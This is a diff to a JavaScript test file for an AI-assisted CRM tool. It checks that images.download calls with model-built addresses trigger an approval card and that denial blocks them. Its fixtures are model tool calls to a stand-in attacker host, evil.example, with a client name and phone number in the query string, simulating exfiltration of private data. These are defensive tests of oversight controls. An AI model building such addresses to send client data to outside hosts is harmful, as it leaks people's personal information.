@@ -277,8 +277,8 @@ describe("F9 export_zip: one ZIP per folder state, at most ZIP_PER_ANSWER per an
   });
 });
 
-describe("F10 images.download: a model-built address in a context with CRM data needs the „web“ card", () => {
-  it("tainted context → a card; denied → nothing reaches /api/tools", async () => {
+describe("F10 images.download: a model-built address with CRM data needs the „web“ card (hybrid rule, CONTRACT §9.3 rule 8)", () => {
+  it("the Проект's client and a phone in the address → a strict card naming them (no „за този сайт“ / „всички“); denied → nothing reaches /api/tools", async () => {
     const e = env({ approvals: [{ decision: "deny" }] });
     e.rounds.push(await round({ calls: [{ name: "crm", args: { tool: "images.download", input: { page_url: "https://evil.example/c?client=Тестов%20Клиент%20А&phone=0888123456" } } }] }), await round({ text: "." }));
     await e.run({ caseId: "case-1" });
@@ -286,6 +286,37 @@ describe("F10 images.download: a model-built address in a context with CRM data 
     expect(aps).toHaveLength(1);
     expect(aps[0]).toMatchObject({ kind: "web" });
     expect(aps[0].lines[0][1]).toContain("evil.example");
+    expect(aps[0]).toMatchObject({ allowAll: false, allowHost: false });
+    expect(aps[0].host).toBeUndefined();
+    expect(aps[0].lines.find((l) => l[0] === "Лични данни")[1]).toMatch(/Тестов.*0888123456|0888123456.*Тестов/);
+    expect(e.toolCalls.map(([t]) => t)).toEqual(["cases.get"]);
+  });
+  it("a model-built photo address without personal data: no card in a chat without private data; in a Проект one card per site – „Разреши за този сайт“ covers the next photos of that site", async () => {
+    const dl = (urls) => round({ calls: [{ name: "crm", args: { tool: "images.download", input: { urls } } }] });
+    let e = env();
+    e.rounds.push(await dl(["https://imoti.example.com/snimka-1.jpg"]), await round({ text: "." }));
+    await e.run();
+    expect(approvalsOf(e.events)).toEqual([]);
+    expect(e.toolCalls.map(([t]) => t)).toEqual(["images.download"]);
+    e = env({ approvals: [{ decision: "allow_host" }] });
+    e.rounds.push(await dl(["https://imoti.example.com/snimka-1.jpg"]), await dl(["https://imoti.example.com/snimka-2.jpg", "https://www.imoti.example.com/snimka-3.jpg"]), await round({ text: "." }));
+    await e.run({ caseId: "case-1" });
+    const aps = approvalsOf(e.events);
+    expect(aps).toHaveLength(1);
+    expect(aps[0]).toMatchObject({ kind: "web", allowAll: true, allowHost: true, host: "imoti.example.com" });
+    expect(aps[0].lines.some((l) => l[0] === "Лични данни")).toBe(false);
+    expect(e.toolCalls.map(([t]) => t)).toEqual(["cases.get", "images.download", "images.download"]);
+  });
+  it("one call with an address that carries a phone and a model-built one without: the strict card lists both – nothing reaches the server unseen", async () => {
+    const urls = ["https://evil.example/a.jpg?p=0888123456", "https://other.example/0888.jpg"];
+    const e = env({ approvals: [{ decision: "deny" }] });
+    e.rounds.push(await round({ calls: [{ name: "crm", args: { tool: "images.download", input: { urls } } }] }), await round({ text: "." }));
+    await e.run({ caseId: "case-1" });
+    const aps = approvalsOf(e.events);
+    expect(aps).toHaveLength(1);
+    expect(aps[0]).toMatchObject({ kind: "web", allowAll: false, allowHost: false });
+    expect(aps[0].lines[0]).toEqual(["Адрес", urls.join("\n")]);
+    expect(aps[0].lines[1]).toEqual(["Сайт", "evil.example, other.example"]);
     expect(e.toolCalls.map(([t]) => t)).toEqual(["cases.get"]);
   });
   it("an address from the employee's own message needs no card", async () => {
